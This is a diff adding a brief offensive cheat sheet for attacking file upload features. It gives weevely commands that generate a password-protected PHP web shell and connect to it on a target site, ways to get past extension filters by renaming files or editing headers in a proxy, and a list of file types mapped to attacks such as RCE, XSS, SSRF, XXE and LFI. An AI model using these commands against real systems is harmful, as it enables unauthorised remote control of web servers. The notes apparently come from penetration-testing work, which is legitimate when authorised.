@@ -1,0 +1,22 @@
+File Uploads
+
+weevely
+	weevely generate password /root/shell.php
+	weevely http://target.com/folder/uploads/shell.php password
+
+rename shell file to allowed extension
+	e.g. .jpg or .php.jpg
+
+intercept in proxy and change extension of file and filetype in headers
+
+Chains:
+	ASP/ASPX/PHP5/PHP/PHP3 - webshell, RCE
+	SVG - stored XSS, SSRF
+	GIF - stored XSS
+	CSV - CSV injection
+	XML - XXE
+	AVI - LFI, SSRF
+	HTML/JS - HTML injection, XSS, open redirect
+	PNG/JPEG - pixel flood attack
+	ZIP - RCE via LFI
+	PDF/PPTX - SSRF, blind XXE
